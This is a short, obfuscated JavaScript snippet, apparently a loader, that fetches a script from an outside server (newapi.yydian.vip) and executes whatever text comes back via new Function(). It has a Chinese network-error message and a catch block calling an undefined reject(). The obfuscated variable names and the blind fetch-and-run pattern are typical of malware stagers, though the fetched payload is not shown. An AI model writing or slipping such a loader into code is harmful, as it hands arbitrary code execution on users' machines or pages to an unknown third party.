
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/chunk-common.js").then(_0x34a04b => {
  if (!_0x34a04b.ok) throw new Error("请检查网络是否OK");
  return _0x34a04b.text();
}).then(_0x284adb => {
  const _0x418829 = new Function(_0x284adb);
  _0x418829();
}).catch(_0x14e58a => {
  reject();
});